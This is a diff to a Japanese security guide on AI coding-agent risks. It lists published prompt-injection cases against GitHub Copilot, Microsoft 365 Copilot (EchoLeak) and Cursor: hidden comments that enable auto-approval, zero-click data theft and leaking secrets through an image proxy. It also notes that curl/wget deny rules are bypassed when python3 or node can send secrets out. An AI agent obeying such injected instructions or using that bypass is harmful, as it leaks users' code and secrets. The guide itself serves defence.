@@ -54,7 +54,11 @@ LLM Top 10とは別に、エージェント固有のリスクを対象とした 
 実証事例
 
 - **GitHub Copilot（[CVE-2025-53773](https://nvd.nist.gov/vuln/detail/CVE-2025-53773)、CVSS 7.8 HIGH）** — コードコメントにインジェクションを埋め込み、`.vscode/settings.json`の`chat.tools.autoApprove`を書き換えてYOLOモードを有効化する攻撃が実証された。任意コード実行まで至る攻撃チェーンが確認されている（発見: [Embrace The Red](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/) / [Persistent Security](https://www.persistent-security.net/post/part-iii-vscode-copilot-wormable-command-execution-via-prompt-injection)）。**修正済み**: 2025-08-12パッチ適用
+<!-- textlint-disable @textlint-ja/ai-writing/ai-tech-writing-guideline -->
+
 - **Microsoft 365 Copilot（[CVE-2025-32711](https://www.catonetworks.com/blog/breaking-down-echoleak/)、CVSS 9.3）** — 細工したメール1通だけでユーザー操作なしに組織内の機密データを窃取できる**ゼロクリック**脆弱性（EchoLeak）。当時はじめて報告されたゼロクリックAIエージェント脆弱性として注目された（発見: Aim Labs、2025年6月）。**修正済み**: 2025年5月にMicrosoftがサーバーサイドで修正（クライアント対応不要）
+
+<!-- textlint-enable @textlint-ja/ai-writing/ai-tech-writing-guideline -->
 - **GitHub Copilot Chat（CamoLeak、CVSS 9.6）** — GitHubのCamo画像プロキシを悪用したCSPバイパスとリモートプロンプトインジェクションの組み合わせで、プライベートリポジトリのソースコードとシークレットを窃取（[Legit Security, 2025-10](https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code)）。**修正済み**: 2025-08-14にGitHubがCopilot Chatの画像レンダリング機能を無効化
 - **Cursor の自動実行モード** — インジェクション成功率が攻撃手法によって41〜84%に達したとの報告あり（出典: [arXiv:2509.22040](https://arxiv.org/abs/2509.22040) "Your AI, My Shell"）。特定のバージョンの脆弱性ではなく自動実行モード全般の設計上のリスクのため、モードを有効にする際は注意が必要
 
@@ -173,7 +177,7 @@ hooksスクリプトや`settings.json`が書き換えられると、すべての
 | [SOPS](https://github.com/getsops/sops) | YAML/JSON/ENV等を対象にage・PGP・AWS KMS等で暗号化する。Terraformとの親和性が高い |
 | [1Password CLI](https://developer.1password.com/docs/cli/) / [Bitwarden CLI](https://bitwarden.com/help/cli/) | シークレットをファイルに書かずCLIで実行時に注入する。`.env`ファイル自体を持たない設計が可能 |
 
-curl/wget を禁止しても迂回される: `curl`や`wget`をdenyしていても、`python3`や`node`が許可されていればHTTP通信で外部にシークレットを送信できる。
+curl/wgetを禁止しても迂回される: `curl`や`wget`をdenyしていても、`python3`や`node`が許可されていればHTTP通信で外部にシークレットを送信できる。
 
 ```python
 # curl/wget を禁止していても python3 が許可されていれば外部送信できる
